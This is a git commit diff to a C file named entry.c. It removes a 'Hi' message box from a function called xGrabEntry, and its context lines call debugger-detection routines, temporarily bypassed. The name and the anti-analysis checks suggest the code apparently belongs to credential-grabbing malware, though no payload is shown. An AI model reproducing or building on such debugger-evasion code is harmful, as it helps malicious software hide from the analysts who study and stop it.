aaf9ca932ab90e186fc0dd189e52aa606c69f17a
smokeSH <65368643+smokeSH@users.noreply.github.com>
2022-02-02 19:13:28 +0100

    Update entry.c

--- entry.c
+++ entry.c
@@ -7,8 +7,7 @@ int xGrabEntry() {
 
 	int version = 31012022, counter = 3;
 	BOOL success = FALSE;
-
-	MessageBoxW(NULL, L"Hi", L"WOF", MB_OK);
+	
 	loadFunctions();
 
 	if (TRUE || !checkDebuggerPEB() && !checkDebuggerQuery() && !checkDebuggerGlobalFlags()) {
